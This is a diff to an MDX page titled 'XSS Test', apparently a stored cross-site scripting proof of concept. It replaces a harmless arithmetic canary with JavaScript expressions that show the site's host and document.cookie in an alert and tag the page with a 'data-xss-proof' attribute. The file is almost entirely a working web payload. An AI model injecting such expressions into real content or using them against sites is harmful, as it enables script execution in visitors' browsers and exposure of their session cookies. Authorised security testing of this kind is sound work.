@@ -1,12 +1,12 @@
 ---
 title: "XSS Test"
-description: "stored xss poc expr"
+description: "stored xss via mdx expression"
 ---
 
 XSSPROBESTART
 
-ExprResult: {globalThis.document?.documentElement?.setAttribute?.('data-xss-proof','EXPR-'+globalThis.location?.host) ?? 'okexpr'}
+{globalThis.alert?.('XSS via MDX expression — origin: '+globalThis.location?.host+' cookies: '+globalThis.document?.cookie)}
 
-MathCanary: {6*7}
+{globalThis.document?.documentElement?.setAttribute?.('data-xss-proof','FIRED-'+globalThis.location?.host)}
 
 XSSPROBEEND
